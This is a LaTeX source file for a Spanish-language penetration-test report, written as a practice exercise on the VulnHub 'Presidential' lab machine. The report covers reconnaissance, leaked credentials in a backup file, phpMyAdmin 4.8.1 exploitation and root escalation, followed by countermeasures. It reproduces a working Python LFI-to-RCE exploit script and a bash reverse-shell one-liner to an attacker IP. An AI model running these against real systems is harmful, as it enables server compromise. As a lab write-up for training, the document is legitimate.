@@ -1,0 +1,608 @@
+\documentclass[a4paper]{article} % Formato plantilla
+
+\usepackage[utf8]{inputenc} % Para evitar errores con caracteres especiales
+\usepackage[spanish]{babel} % Para evitar errores con caracteres especiales
+\usepackage[margin=2cm, top=2cm, includefoot]{geometry} % Para establecer márgenes
+\usepackage{graphicx} % Para la inserción de imágenes
+\usepackage[table,xcdraw]{xcolor} % Para la representación de colores
+\usepackage{tikz,lipsum,lmodern} % Para la creación de cajar
+\usepackage[most]{tcolorbox} % Para incorporar colores en la caja
+\usepackage{fancyhdr} % Estilo de la página
+\usepackage[hidelinks]{hyperref} % Gestión de hipervínculos
+\usepackage{setspace} % Para aumentar el interlineado
+\setstretch{1.2}
+\usepackage{parskip} % Eliminar sangría
+\usepackage[figurename=Imagen]{caption}
+\usepackage{ragged2e}
+\usepackage{listings} % Para la insrción de código
+
+% Declaración de variables personalizadas
+\newcommand{\logoPortada}{images/vulnhub.png}
+\newcommand{\companyName}{JASO TOWER CRANES}
+\newcommand{\logoEmpresa}{images/jaso.png}
+\newcommand{\startDate}{13 de Mayo de 2024}
+\newcommand{\logoAuditor}{images/logoJASO.png}
+\newcommand{\logoVulnhub}{images/logoVulnhub.png}
+
+% Definición de colores
+\definecolor{bluePortada}{HTML}{146c8a}
+
+\newtcolorbox{definicion}{
+  breakable,
+  enhanced,
+  colback=white,
+  colframe=bluePortada!75!black,
+  arc=0mm,
+  boxrule=1pt,
+  leftrule=12mm,
+  fonttitle=\bfseries,
+  coltitle=blue!75!black,
+  title=Definición,
+  attach title to upper=\par,
+}
+
+% Adicionales
+\pagestyle{fancy}
+\setlength{\headheight}{40.2pt}
+\fancyhf{}
+\lhead{\includegraphics[width=3cm]{\logoAuditor}}\rhead{\includegraphics[height=1cm]{\logoVulnhub}}
+\renewcommand{\headrulewidth}{2pt} % Aumentar tamaño barra
+\renewcommand{\headrule}{\hbox to\headwidth{\color{bluePortada}\leaders\hrule height \headrulewidth\hfill}}
+\renewcommand{\lstlistingname}{Código}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\ttfamily\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2
+}
+\lstset{style=mystyle}
+
+\begin{document} % Inicio del documento
+  \cfoot{\thepage}
+  \begin{titlepage}
+    \centering
+    \includegraphics[width=0.5\textwidth]{\logoPortada}\par\vspace{1cm}
+    {\scshape\LARGE \textbf{Informe Técnico}\par\vspace{0.4cm}}
+    {\Huge\textcolor{bluePortada}{\textbf{{Empresa \companyName}}}}
+    \vfill
+      \includegraphics[width=\textwidth]{\logoEmpresa}
+    \vfill
+    \begin{tcolorbox}[colback=red!5!white,colframe=red!75!black]
+      \centering
+        Este documento es confidencial y contiene información sensible.
+        \\No debería ser impreso o compartido con terceras entidades.
+    \end{tcolorbox}
+
+    \vfill
+      {\large \startDate}
+    \vfill
+  \end{titlepage}
+
+  % -------------------------------------------------------------------
+  % Comienzo del índice
+  \clearpage
+  \tableofcontents
+  \clearpage
+  % -------------------------------------------------------------------
+  \section{Antecedentes}
+  El presente documento recoge los resultados obtenidos durante la fase de auditoría a la empresa \textbf{\companyName}, dedicada a dar servicios a diferentes instituciones en todo el mundo, enumerando todos los vectores de ataque encontrados, así como la explotación llevada a cabo para cada uno de estos.
+
+  En este caso, la empresa ha solicitado que se realice la auditoría al servidor web en el que se encuentra alojada la página web de \textbf{La Casa Blanca}. Esta se ha llevado a cabo realizando las pruebas directamente a su dirección IP facilitada por la compañía.
+
+  A continuación, se proporciona el enlace directo a la página alojada en la dirección IP especificada, usada como punto de partida, así como una foto de la página que se aprecia por defecto:
+
+  \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=bluePortada!80!black,
+  title=Dirección URL,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=bluePortada!50!black} ]
+  \centering
+    \href{https://www.vulnhub.com/entry/presidential-1,500/}{\textbf{\color{bluePortada}http://192.168.30.41/index.html}}
+  \end{tcolorbox}
+
+  \vspace{0.5cm}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/principalPage.png}}
+    \caption{Página principal del servicio web de \textbf{\companyName}.}
+  \end{figure}
+
+  \section{Objetivos}
+
+  Los objetivos de la presente auditoría de seguridad se enfocan, primeramente, en la identificación de posibles vulnerabilidades y debilidades del servidor web la empresa \textbf{\color{bluePortada}{\companyName}} ofrece a \textbf{La Casa Blanca} para su posterior explotación, con el propósito de garantizar la integridad y confidencialidad de la información almacenada en él.
+
+  Para ello, se ha llevado a cabo un análisis exhaustivo de todos los servicios detectados que se encontraban expuestos en dicho servidor, recopilando toda la información detallada posible de aquellos que representan un riesgo potencial desde el punto de vista de la seguridad.
+
+  \clearpage
+  \subsection{Alcance}
+
+  A continuación se ven representados los objetivos a cumplir para esta auditoría:
+
+  \begin{itemize}
+    \item Identificar los puertos y servicios vulnerables.
+    \item Relizar una explotación de las vulnerabilidades encontradas.
+    \item Conseguir acceso al servidor mediante la explotación d elos servicios vulnerables identificados.
+    \item Enumerar vías potenciales de elevar privilegios en el sistema una vez este ha sido vulnerado.
+  \end{itemize}
+
+  \subsection{Impedimentos y limitaciones}
+  
+  Durante el proceso de auditoría está terminantemente prohibido realizar cualquiera de las actividades aquí especificadas:
+
+  \begin{itemize}
+    \item Relizar tareas que puedan ocasionar una \textbf{denegación de servicio} y/o afectar a la disponibilidad de los servicios expuestos.
+    \item \textbf{Eliminar archivos} existentes en el servidor una vez este ha sido vulnerado.
+    \item \textbf{Descargar y almacenar} información sensible en cuanto a trabajadores respecta.
+  \end{itemize}
+
+
+  \subsection{Resumen general}
+    Tras la realización de esta auditoría, se puede conocer con certeza que el servidor cuenta con varias vulnerabilidades y algún error de desarrollo.
+    En una primera instancia se ha encontrado, a través un ataque de \textbf{fuerza bruta} llevada a cabo en la \hyperref[sec:reconocimiento]{\textbf{Fase de enumeración y reconocimiento}}, el subdominio \hyperref[sec:subdomains]{'\textbf{datasafe.votenow.local}'} que cuenta con un panel de autenticación de \hyperref[sec:phpmyadmin]{\textbf{PhpMyAdmin}}. Sobre este subdominio encontrado se ha aplicado de nuevo un reconocimiento con el fin de averiguar si existen recursos expuestos con diferentes extensiones, como '\textbf{.php}' o '\textbf{.php.bak}' que podrían llegar a conllevar un riesgo desde el punto de vista de la seguridad. Se comprueba que bajo este subdominio se encuentra expuesto un archivo de BackUp bajo el nombre \hyperref[sec:backup]{'\textbf{config.php.bak}'} que almacena una serie de credenciales aquí reflejadas:
+    \begin{itemize}
+      \item Usuario: '\textbf{votebox}'
+      \item Contraseña: '\textbf{casoj3FFASPsbyoRP}'
+    \end{itemize}
+    Estas credenciales han sido comprobadas en el panel de autenticación de \textbf{PhpMyAdmin} anteriormente mencionado averiguando así que son válidas para el inicio de sesión.
+
+    Una vez con acceso a esta herramienta, se visualiza la versión de esta utilizada, en este caso la \textbf{4.8.1}, la cual además de encontrarse completamente desactualizada, tras una pequeña consulta, se encuentran diferentes vulnerabilidades asociadas a ella.
+
+    Debido a la existencia de estas vulnerabilidades se ha podido llevar a cabo un \textbf{LFI} utilizado para derivar a un \textbf{RCE} para así ganar acceso al servidor como el usuario '\textbf{apache}'.
+
+    Tras este acceso, se ha procedido a la escalada de privilegios para migrar al usuario '\textbf{root}' obteniendo así acceso total al servidor.
+
+    Por último se han especificado las \hyperref[sec:contramedidas]{\textbf{Contramedidas}} a llevar a cabo para mitigar estas vulnerabilidades.
+
+  \clearpage
+
+  \section{Reconocimiento}\label{sec:reconocimiento}
+    La primera fase llevada a cabo en esta auditoría es la de \textbf{reconocimiento}, en la que se enumeran los puertos y servicios expuestos, así como de las versiones de estos además de la versión del sistema operativo que corre en el servidor.
+  \subsection{Enumeración de servicios expuestos}
+    A continuación, se adjunta una evidencia de los puertos y servicios identificados durante el reconocimiento aplicado con la herramienta \textbf{nmap}:
+
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/ports.png}}
+    \caption{Enumeración de puertos con nmap.}
+  \end{figure}
+
+
+  En este caso, de han identificado dos puertos abiertos por el protocolo TCP. Aquí se ven representados:
+
+  \vspace{0.5cm}
+
+  \centering
+  \begin{tikzpicture}[node distance=2cm, every node/.style={rectangle, draw, fill=white}]
+    \node (center) {TCP};
+    \node (port1) [below left of=center, node distance=3cm] {Puerto 80};
+    \node (port2) [below right of=center, node distance=3cm] {Puerto 2082};
+    \draw (center) -- (port1);
+    \draw (center) -- (port2);
+  \end{tikzpicture}
+
+  \vspace{0.5cm}
+
+  \justifying
+
+  Asímismo, no se encontró ningún puerto abierto a través de otros protocolos, por lo que se prioriza la evaluación de los dos puertos identificados en el primer escaneo efectuado que se puede ver reflejado en la \textbf{Imagen 2}.
+
+  \clearpage
+  \subsection{Enumeración de servidores web}
+
+  A continuación, se adjunta una evidencia de los resultados obtenidos haciendo uso de \textbf{WhatWeb}, herramienta de reconocimiento utilizada para identificar las tecnologías empleadas en un sitio web especificado, tras haber aplicado un reconocimiento sobre el servicio \textbf{HTTP} corriendo por el puerto 80:
+
+   \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/whatweb.png}}
+     \caption{Enumeración del servicio \textbf{HTTP} por el puerto 80}
+  \end{figure}
+
+  En los resultados obtenidos, se identifican las versiones para alguna de las tecnologías utilizadas en el servidor web:
+
+  \vspace{0.4cm}
+  \centering
+  \begin{tabular}{ c | c}
+    \textbf{Tecnología} & \textbf{Versión} \\
+    \hline
+    PHP & 5.5.38 \\
+    Apache & 2.4.6
+  \end{tabular}
+  
+  \justifying
+
+  Dentro de la información representada en la \textbf{Imagen 3}, tambíen se identifican dos correos electrónicos de la compañía, los cuales podrían ser utilizados en un ataque de \textbf{phishing} dirigido:
+
+  \vspace{0.3cm}
+  \begin{center}
+    \texttt{contact@example.com} \qquad \texttt{contact@votenow.local}
+  \end{center}
+
+  \vspace{0.3cm}
+  \begin{definicion}
+    El \textbf{phishing} es un tipo de ataque informático utilizado por los ciberdelincuentes para engañar a los usuarios con el fin de obtener información confidencial, como pueden ser contraseñas o información bancaria a través de páginas fraudulentas que se hacen pasar por las legítimas llegando a los usuarios a través de correos electrónicos o SMS (\textbf{SMShing}).
+  \end{definicion}
+  % \clearpage
+
+  Adicionalmente, se ha podido identificar la versión de \textbf{[CentOS]} que se encuentra activa en el servidor a través del uso de otra herramienta llamada \textbf{wig} que permite un reconocimiento más exhaustivo sobre un servidor web:
+
+%  \vspace{0.3cm}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.65\textwidth]{images/wig.png}}
+    \caption{Enumeración del servicio \textbf{HTTP} por el puerto 80}
+  \end{figure}
+
+  \clearpage
+
+  \subsection{Enumeración de subdominios}\label{sec:subdomains}
+  Una vez identificado el dominio '\textbf{votenow.local}' gracias a los correos obtenidos, se ha procedido a aplicar un ataque de fuerza bruta con el uso de la herramienta \textbf{gobuster}, herramienta automatizada que permite hacer uso de un diccionario para enumerar rutas y subdominios válidos, sobre dicho dominio principal con el fin de identificar subdominios válidos. Estos han sido los resultados:
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \makebox[\textwidth]{\fbox{\includegraphics[width=0.94\paperwidth]{images/gobuster.png}}}
+    \caption{Subdominios encontrados con la herramienta \textbf{GoBuster}.}
+  \end{figure}
+  
+  % \clearpage
+  Se identificó el dominio '\textbf{datasafe.votenow.local}' como un subdominio válido. Este representó un punto crucial en la auditoría, dado que fue a través de este que se ha conseguido ingresar al sistema mediante la explotación de una vulnerabilidad existente en la herramienta \textbf{PhpMyAdmin} que se encuentra alojada en él.
+
+  Cabe destacar que para hacer accesibles estos dominios y subdominios, ha sido necesaria la edición del archivo '\textbf{/etc/hosts}' introduciendo el siguiente contenido:
+
+ \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.8\textwidth]{images/virtualHosting.png}}
+    \caption{Contenido del archivo \textbf{/etc/hosts}}
+ \end{figure}
+
+  Esto es necesario dado que se está aplicando '\textbf{Virtual Hosting}', técnica utilizada en servidores para alojar múltiples sitios web en una sola máquina física. El archivo '\textbf{/etc/hosts}' es utilizado para la asociación de un nombre de dominio con la dirección IP de su servidor.
+
+  Si esta acción no se realiza, no sería posible determinar el sitio web correspondiente, ya que el servidor respondería mostrando un error o un sitio web incorrecto.
+
+  \clearpage
+  \subsection{Enumeración de paneles de autenticación}\label{sec:phpmyadmin}
+
+  Una vez descubierto el subdominio '\textbf{datasafe.votenow.local}', representado en la \textbf{Imagen 5}, se encontró el siguiente panel de autenticación de \textbf{PhpMyAdmin} alojado en él:
+
+  \vspace{0.2cm}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/phpmyadmin.png}}
+    \caption{Panel de autenticación de \textbf{PhpMyAdmin}.}
+  \end{figure}
+
+  \section{Identificación y explotación de vulnerabilidades}
+  En esta otra fase se llevan a cabo las identificaciones de vulnerabilidades en todos los servicios anteriormente enumerados para proceder posteriormente a su explotación.
+
+  \subsection{Archivo BackUp expuesto}\label{sec:backup}
+
+  Durante la fase de reconocimiento llevada a cabo con la herramienta \textbf{gobuster}, con la especificación de extensiones de archivos '\textbf{.bak}' y '\textbf{.php.bak}' con el fin de enumerar únicamente archivos con esta extensión, se ha identificado un \textbf{archivo de BackUp} expuesto en el servidor:
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/backup.png}}
+    \caption{Archivo de BackUp expuesto en el servidor.}
+  \end{figure}
+
+  \clearpage
+
+  Este archivo fue descargado con el mero objetivo de si este disponía de información sensible la cual pudiera suponer un riesgo desde el punto de vista de la seguridad (tras su análisis ha sido completamente eliminado). Tras su descarga y visualización de su contenido, se determina que el archivo contiene la siguiente información privilegiada:
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/credentials.png}}
+    \caption{Credenciales de acceso encontradas en el archivo de BackUp.}
+  \end{figure}
+
+  Estas credenciales corresponden a las credenciales de acceso a la base de datos, las cuales a su vez están reutilizadas, tanto el usuario como la contraseña, para acceder a la herramienta \textbf{PhpMyAdmin} a través del panel de autenticación representado en la \textbf{Imagen 7}, lo cual es muy mala práctica bajo el punto de vista de la seguridad. Se adjunta una evidencia del acceso exitoso a la herramienta:
+
+  \vspace{0.2cm}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=\textwidth]{images/phpmyadmindentro.png}}
+    \caption{Inicio de sesión exitoso en \textbf{PhpMyAdmin}.}
+  \end{figure}
+
+  \clearpage
+  \subsection{Explotación del PhpMyAdmin}
+
+  Una vez con acceso a \textbf{PhpMyAdmin}, fue fácilmente posible la identificación de la versión actualmente en uso de la herramienta en el servidor web:
+
+  \vspace{0.2cm}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.8\textwidth]{images/versionphpmyadmin.png}}
+    \caption{Versión de \textbf{PhpMyAdmin} en uso.}
+  \end{figure}
+
+  \vspace{0.3cm}
+  Esta versión corresponde a una \textbf{versión antigua} de PhpMyAdmin, lo que expone al servidor web a varias \textbf{vulnerabilidades críticas} identificadas fácilmente enumerables con la herramienta \textbf{searchsploit} que cuenta con conexión directa a la base de datos de '\textbf{Exploit-DB}', donde se encuentran almacenadas todas las vulnerabilidades conocidas junto con el código necesario para su explotación:
+
+  \vspace{0.2cm}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.9\textwidth]{images/searchsploit.png}}
+    \caption{Vulnerabilidades para la versión de \textbf{PhpMyAdmin} en uso.}
+  \end{figure}
+
+  \vspace{0.2cm}
+  Se observan tres diferentes vulnerabilidades, donde se puede observar que la última de ellas permite \textbf{ejecución de código remoto} en el servidor, más conocida como \textbf{RCE}.
+
+  \begin{definicion}
+    \textbf{RCE (Remote Code Execution)} es una vulnerabilidad que afecta a las aplicaciones web permitiendo la ejecución de código arbitrario en el servidor de forma remota, haciendo posible ganar acceso a este tomando el control total.
+  \end{definicion}
+
+  \clearpage
+
+  A continuación, se comparte el script en \textbf{Python3} empleado para la ejecución de código de manera remota en el servidor, explotando la vulnerabilidad anteriormente mencionada reportado por la herramienta \textbf{searchsploit} representada en la \textbf{Imagen 12}:
+
+  \vspace{0.2cm}
+
+  \begin{lstlisting}[language=Python, caption=Exploit para la versión vulnerable de \textbf{PhpMyAdmin}.]
+#!/usr/bin/env python
+
+import re, requests, sys, html
+
+def get_token(content):
+  s = re.search('token"\s*value="(.*?)"', content)
+  token = html.unescape(s.group(1))
+  return token
+
+ipaddr = sys.argv[1]
+port = sys.argv[2]
+path = sys.argv[3]
+username = sys.argv[4]
+password = sys.argv[5]
+command = sys.argv[6]
+
+url = "http://{}:{}{}".format(ipaddr,port,path)
+
+url1 = url + "/index.php"
+r = requests.get(url1)
+content = r.content.decode('utf-8')
+
+s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
+version = s.group(1)
+
+cookies = r.cookies
+token = get_token(content)
+
+p = {'token': token, 'pma_username': username, 'pma_password': password}
+r = requests.post(url1, cookies = cookies, data = p)
+content = r.content.decode('utf-8')
+s = re.search('logged_in:(\w+),', content)
+logged_in = s.group(1)
+
+cookies = r.cookies
+token = get_token(content)
+
+url2 = url + "/import.php"
+
+payload = '''select '<?php system("{}") ?>';'''.format(command)
+p = {'table':'', 'token': token, 'sql_query': payload }
+r = requests.post(url2, cookies = cookies, data = p)
+
+session_id = cookies.get_dict()['phpMyAdmin']
+url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
+r = requests.get(url3, cookies = cookies)
+
+content = r.content.decode('utf-8', errors="replace")
+s = re.search("select '(.*?)\n'", content, re.DOTALL)
+if s != None:
+  print(s.group(1))
+
+  \end{lstlisting}
+
+  \clearpage
+
+    Haciendo uso de este exploit, especificando la información necesaria del servidor, se ejecuta un comando de manera remota, logrando así el acceso a este:
+
+  \vspace{0.2cm}
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \makebox[\textwidth]{\fbox{\includegraphics[width=0.94\paperwidth]{images/conexión.png}}}
+    \caption{Ganando acceso al servidor a través de la explotación de un \textbf{RCE}.}
+  \end{figure}
+
+  En este caso, se ejecuta un siguiente comando que mediante la ejecución del exploit encontrado (\textbf{Código 1}) permite entablar una \textbf{reverse shell} al atacante:
+
+  \vspace{0.3cm}
+
+  \begin{lstlisting}[language=Bash, caption=Comando encargado de entablar una \textbf{reverse shell}.]
+bash -i >& /dev/tcp/192.168.245.130/443 0>&1
+  \end{lstlisting}
+  Haciendo la ejecución de esta manera, se evita alojar archivos residuales en el servidor y por lo tanto menos menos prueba de la conexión. Una vez ejecutado el comando, se gana acceso al servidor, teniendo el control de la máquina como el usuario '\textbf{apache}' que es el encargado de la ejecución del servicio web.
+
+  Tal y como se aprecia en el script reflejado en el \textbf{Código 1}, este se aprovecha de una vulnerabildad de tipo \textbf{LFI} existente en esta versión de \textbf{PhpMyAdmin} a través del parámetro '\textbf{target}', que al ser vulnerable permite realizar un \textbf{Directory PATH traversal} para conseguir la ejecución remota de comandos:
+
+  \vspace{0.2cm}
+
+  \begin{lstlisting}[language=Python, caption=Porción de código donde se realiza el \textbf{LFI}.]
+session_id = cookies.get_dict()['phpMyAdmin']
+url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
+r = requests.get(url3, cookies = cookies)
+  \end{lstlisting}
+
+\begin{definicion}
+  \textbf{LFI (Local File Inclusion)} es una vulnerabilidad que afecta a las aplicaciones web que permite el acceso no autorizado a archivos locales alojados en el servidor a través de la intrusión de archivos locales en una página web.
+\end{definicion}
+
+  \clearpage
+
+  A través del \textbf{LFI}, se consigue apuntar a un recurso el cual almacena información relacionada con las diferentes sesiones activas en uso del lado de los usuarios.
+
+  Aprovechando esta lectura mencionada y la propia sesión del usuario obtenida con las credenciales encontradas representadas en la \textbf{Imagen 9}, lo que se consigue es, a través de una \textbf{Query SQL}, introducir una consulta la cuál contiene \textbf{código PHP}, visible desde los archivos de sesión del usuario a través del \textbf{LFI}. Esto en consecuencia conduce a una ejecución remota de comandos, dado que al apuntar al recurso y estar accesible el código PHP es interpretado por el servidor.
+
+  \section{Escalada de privilegios}
+    Esta fase es llevada a cabo tras conseguir acceso al servidor como se ve representado en la \textbf{Imagen 13}. Una vez en este punto, como se ha mencionado anteriormente, el acceso se ha conseguido como el usuario '\textbf{apache}', usuario que no cuenta con demasiados privilegios, pero, es en esta fase, en la cual se intenta aumentar estos privilegios lo máximo posible, preferiblemente consiguiendo el control total del servidor como el usuario '\textbf{root}'.
+
+    En primera instancia, se visualiza en el directorio \textbf{/home} la existencia de un usuario llamado '\textbf{admin}' al cual únicamente él tiene permiso de acceso:
+
+    \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.7\textwidth]{images/admin.png}}
+      \caption{Evidencia de la existencia del usuario '\textbf{admin}'.}
+  \end{figure}
+
+  Conociendo esta información, se intenta realizar la migración a este usuario. Para esto, se hace provecho del acceso obtenido a \textbf{PhpMyAdmin} utilizado para la gestión de la base de datos, accediendo a los usuarios existentes donde se comprueba que existe el usuario '\textbf{admin}' y su contraseña hasheada:
+
+  \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.9\textwidth]{images/hash.png}}
+    \caption{Usuario '\textbf{admin}' con su contraseña hasheada.}
+  \end{figure}
+
+  \clearpage
+
+  Se procede a crackear la contraseña con el uso de la herramienta \textbf{JohnTheRipper}, que permite realizar ataques de fuerza bruta sobre un hash usando un diccionario, en este caso uno muy conocido llamado '\textbf{rockyou.txt}'. Con esto se consigue visualizar la contraseña en texto claro:
+
+ \begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.9\textwidth]{images/pass.png}}
+    \caption{Contraseña del usuario '\textbf{admin}' en texto claro.}
+ \end{figure}
+
+  Conociendo su contraseña, se procede a la migración a este usuario, teniendo así acceso a su directorio personal y sus recursos:
+
+\begin{figure}[h]
+    \centering
+    \setlength{\fboxrule}{0.8pt}
+    \fbox{\includegraphics[width=0.5\textwidth]{images/access.png}}
+    \caption{Migración al usuario '\textbf{admin}' en el sistema.}
+ \end{figure}
+
+  Ya se ha ganado acceso al sistema como el usuario '\textbf{admin}' que cuenta ya de por sí cuenta con mayores privilegios que el usuario '\textbf{apache}', pero que no cuenta con permisos totales, por lo que se sigue intentando la migración al usuario co control total que es '\textbf{root}'.
+
+  Haciendo una búsqueda de las \textbf{capabilities}, que son capacidades que se asignan a los usuarios permitiendo realizar acciones como el usuario privilegiado, con las que cuenta el usuario '\textbf{admin}', se encuentra una que permite la lectura de cualquier archivo del sistema mediante el uso de \textbf{tarS}, similar a \textbf{tar}:
+
+    \begin{figure}[h]
+      \centering
+      \setlength{\fboxrule}{0.8pt}
+      \fbox{\includegraphics[width=0.5\textwidth]{images/cap.png}}
+      \caption{\textbf{Capability} de uso de \textbf{tarS} como usuario privilegiado.}
+    \end{figure}
+
+    \clearpage
+
+    Haciendo uso de esta capacidad que se le permite al usuario al que se ha migrado anteriormente, desde el directorio \textbf{/tmp} para asegurar el permiso de escritura, se comprime la clave privada del usuario '\textbf{root}' para su posterior descompresión y lectura. Esta acción se realiza debido a que en la \hyperref[sec:reconocimiento]{\textbf{Fase de enumeración y reconocimiento}} se pudo comprobar que en el \textbf{puerto 2082} se encuentra el servicio \textbf{SSH} expuesto, por lo que esta clave debería existir en caso de permitir la conexión mediante claves:
+
+    \begin{figure}[h]
+      \centering
+      \setlength{\fboxrule}{0.8pt}
+      \fbox{\includegraphics[width=0.7\textwidth]{images/rsa.png}}
+      \caption{Compresión de la clave privada de '\textbf{root}'.}
+    \end{figure}
+
+    Para la visualización del contenido de este archivo comprimido, basta con descomprimirlo y ya se obtiene libertad para su lectura:
+
+   \begin{figure}[h]
+      \centering
+      \setlength{\fboxrule}{0.8pt}
+      \fbox{\includegraphics[width=0.5\textwidth]{images/des.png}}
+      \caption{Descompresión y evidencia del contenido de la clave privada de '\textbf{root}'.}
+   \end{figure}
+
+  Y una vez en este punto, se intenta establecer la conexión por \textbf{SSH} al servidor, como el usuario '\textbf{root}' haciendo uso de su clave privada y a través del \textbf{puerto 2082}:
+
+  \begin{figure}[h]
+      \centering
+      \setlength{\fboxrule}{0.8pt}
+      \fbox{\includegraphics[width=0.9\textwidth]{images/root.png}}
+      \caption{Acceso existoso como el usuario '\textbf{root}' a través de \textbf{SSH}.}
+ \end{figure}
+
+  Ha quedado comprobado que a través de una vulnerabilidad alojada en \textbf{PhpMyAdmin} ha sido posible ganar acceso al servidor, y junto con una \textbf{capability} mal aplicada se ha obtenido control total sobre este.
+
+  \clearpage
+
+  \section{Contramedidas y buenas prácticas}\label{sec:contramedidas}
+    Con el objetivo de evitar posibles explotaciones de las vulnerabilidades en el servidor expuesto, se enumeran a continuación una serie de buenas prácticas a llevar a cabo para las diferentes vulnerabilidades descubiertas y reportadas anteriormente.
+
+    \subsection{PhpMyAdmin 4.8.1 vulnerable}
+    
+  \textbf{PhpMyAdmin} es una herramienta popular para administrar bases de datos MySQL a través de una interfaz web. Sin embargo, la versión que corre en su servidor (4.8.1), cuenta con una vulnerabilidad conocida que permite a un atacante ejecutar código arbitrario de forma remota en el servidor web donde está corriendo.
+
+  Para corregir esta vulnerabilidad es necesario llevar a cabo una actualización de esta herramienta a su versión más reciente (actualmente la 5.2.1). En caso de que no sea posible efectuar esta acción, se pueden tomar diversas medidas para mitigar o reducir el riesgo de explotación de esta vulnerabilidad:
+
+  \begin{itemize}
+    \item Corregir el código del script '\textbf{index.php}' para que la variable '\textbf{target}' proporcionada por el usuario esté correctamente validada para evitar el \textbf{LFI}:
+    \begin{figure}[h]
+      \centering
+      \setlength{\fboxrule}{0.8pt}
+      \fbox{\includegraphics[width=0.8\textwidth]{images/target.png}}
+      \caption{Parámetro '\textbf{target}' vulnerable a '\textbf{LFI}'.}
+   \end{figure}
+  \end{itemize}
+
+  \begin{itemize}
+    \item En lugar de permitir que el usuario especifique cualquier archivo del servidor incluir, se recomienda definir una lista de archivos en la que se indiquen los que se permitan ser especificados para luego comprobar que el valor introducido en el parámetro '\textbf{target}' se encuentra en dicha lista.
+  \end{itemize}
+
+    \subsection{Reutilización de credenciales}
+
+  Tras la mitigación de esta vulnerabilidad, la siguiente medida a tomar, es \textbf{NO REUTILIZAR CREDENCIALES}, ya que se ha comprobado que la conexión con la base de datos se realiza mediante con las mismas credenciales que permiten el acceso a \textbf{PhpMyAdmin} como ha quedado comprobado en la \textbf{Imagen 10}. Este error quedaría corregido utilizando credenciales diferentes para cada servicio y/o herramienta, de esta manera, si un atacante encuentra credenciales válidas, únicamente pueda acceder a ese servicio específico.
+
+  \clearpage
+
+    \subsection{Capabilities mal aplicadas}
+
+  Estas son las medidas a llevar a cabo para mitigar las vulnerabilidades que permitían ganar el acceso al servidor, pero en caso de no poder llevarse a cabo y un atacante gana acceso al servidor, estas son algunas medidas para que no pueda obtener control total de este y no sea posible \textbf{migrar a otros usuarios}:
+
+  \begin{itemize}
+    \item \textbf{Uso de contraseñas fuertes}. La contraseña del usuario '\textbf{admin}' es '\textbf{Stella}', la cual ha podido ser crackeada en apenas unos segundos, es preferible aplicar \textbf{políticas de seguridad} exigidas en la creación de las contraseñas para que cumplan unos \textbf{requisitos de complejidad}, como por ejemplo el uso mínimo de caracteres, combinación de números y caracteres especiales, etc.
+    \item \textbf{Eliminar capabilities innecesarias}. Como ha quedado comprobado en la \textbf{Imagen 18}, se han aplicado una serie de capacidades que podrían conllevar un riesgo desde el punto de vista de la seguridad.
+  \end{itemize}
+
+  Aplicando todas las medidas mencionadas, se verían mitigadas todas las vulnerabilidades encontradas en esta auditoría, pero podrían aparecer otras nuevas, por lo que se debe tener en cuenta hacer uso de aplicaciones siempre actualizadas en el futuro y mantener todas estas medidas para todos los usuarios.
+
+  \section{Conclusiones}
+
+  Han sido detectadas una serie de \textbf{vulnerabilidades críticas} que pueden suponerun riesgo muy alto desde el punto de vista de la seguridad.
+
+  En una primera instancia, ha sido posible, a través de una de estas vulnerabilidades encontradas en el servidor, ganar acceso a este como el usuario '\textbf{apache}', siendo esto posible debido a una versión desactualizada de la herramienta \textbf{PhpMyAdmin} existente en un subdominio identificado durante el proceso de reconocimiento y enumeración.
+
